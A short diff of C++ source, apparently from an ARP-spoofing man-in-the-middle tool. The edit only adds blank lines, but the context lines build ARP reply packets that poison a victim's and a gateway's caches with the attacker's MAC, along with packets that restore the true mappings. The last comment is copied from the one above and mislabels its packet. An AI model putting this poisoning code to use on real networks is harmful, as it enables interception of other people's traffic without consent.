@@ -25,10 +25,13 @@ Mitm::Mitm(const NetworkInterface &iface, std::ostream *out, const std::vector<s
 
             // Tell gateway thats _victim.ip() is _attackerMac (sender, sender, target, target)
             _poisonPackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), _attacker.mac()));
+
             // Tell victim thats _gateway.ip() is _attackerMac
             _poisonPackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _attacker.mac()));
+
             // Tell victim thats _gateway.ip() is gatewayMac
             _basePackets.push_back(ARP::make_arp_reply(victimIp, _gateway.ip(), victimMac, _gateway.mac()));
+
             // Tell victim thats _gateway.ip() is gatewayMac
             _basePackets.push_back(ARP::make_arp_reply(_gateway.ip(), victimIp, _gateway.mac(), victimMac));
         }
